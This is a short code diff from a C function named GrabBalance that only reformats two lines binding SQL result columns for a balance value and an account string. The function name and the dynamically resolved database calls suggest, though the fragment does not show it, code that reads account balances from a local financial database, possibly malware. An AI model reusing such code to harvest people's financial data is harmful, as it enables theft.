@@ -127,8 +127,8 @@ char *GrabBalance(char *lpPath)
 			SQLINTEGER Rest=0;
             //pSQLBindCol(hBalance,1,SQL_C_DOUBLE,&Rest,sizeof(Rest),&tmp);
             pSQLBindCol(hBalance,1,SQL_C_SLONG,&Rest,sizeof(Rest),&tmp);
-            SQLCHAR Account[25]={0};
-            pSQLBindCol(hBalance,2,SQL_C_CHAR,&Account,sizeof(Account),&tmp);
+            SQLCHAR Account[25] = {0};
+			pSQLBindCol(hBalance, 2, SQL_C_CHAR, &Account, sizeof(Account), &tmp);
             pSQLExecute(hBalance);
 
             lpBalance=(char*)MemAlloc(1024); lpBalance[0] = 0;
